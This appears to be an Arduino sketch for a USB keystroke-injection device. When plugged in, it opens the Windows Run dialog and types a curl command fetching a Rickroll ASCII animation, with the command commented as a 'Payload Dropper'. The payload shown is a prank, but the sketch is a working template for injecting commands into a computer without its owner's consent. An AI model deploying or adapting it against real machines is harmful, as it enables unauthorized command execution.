#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(2000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(1200);
Keyboard.print(F("curl http://ascii.live/rick")); //Payload Dropper
typeKey(KEY_RETURN);
delay(5000);
Keyboard.end();
delay(5000);
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
